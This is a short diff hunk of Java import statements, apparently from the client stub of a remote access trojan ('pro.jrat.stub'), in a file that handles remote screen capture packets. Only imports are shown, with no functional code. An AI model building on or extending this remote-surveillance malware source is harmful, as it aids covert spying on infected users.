@@ -9,11 +9,7 @@ import java.awt.Rectangle;
 import java.awt.Robot;
 import java.awt.Toolkit;
 import java.awt.image.BufferedImage;
-import java.io.FileOutputStream;
 
-
-import pro.jrat.stub.packets.incoming.Packet12RemoteScreen;
-import pro.jrat.stub.packets.incoming.Packet13OneRemoteScreen;
 import pro.jrat.stub.packets.outgoing.AbstractOutgoingPacket;
 import pro.jrat.stub.packets.outgoing.Packet17RemoteScreen;
 import pro.jrat.stub.packets.outgoing.Packet18OneRemoteScreen;
